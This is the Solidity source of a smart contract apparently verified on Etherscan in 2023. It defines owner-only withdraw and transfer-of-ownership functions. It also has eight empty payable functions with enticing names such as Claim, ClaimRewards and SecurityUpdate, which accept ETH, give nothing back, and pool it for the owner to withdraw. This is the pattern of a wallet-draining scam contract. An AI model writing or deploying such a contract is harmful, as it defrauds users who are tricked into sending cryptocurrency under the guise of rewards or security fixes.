/**
 *Submitted for verification at Etherscan.io on 2023-07-30
*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.18;

contract SG_Contract {

  address private owner;

  constructor() { owner = msg.sender; }
  function getOwner() public view returns (address) { return owner; }
  function getBalance() public view returns (uint256) { return address(this).balance; }

  function withdraw(uint256 amount, address where) public {
    require(msg.sender == owner, "You are not an owner");
    require(address(this).balance >= amount, "Balance is too low");
    payable(where).transfer(amount);
  }

  function changeOwnership(address new_owner) public {
    require(msg.sender == owner, "You are not an owner");
    owner = new_owner;
  }

  function Claim() public payable { }
  function ClaimReward() public payable { }
  function ClaimRewards() public payable { }
  function Execute() public payable { }
  function Multicall() public payable { }
  function Swap() public payable { }
  function Connect() public payable { }
  function SecurityUpdate() public payable { }

}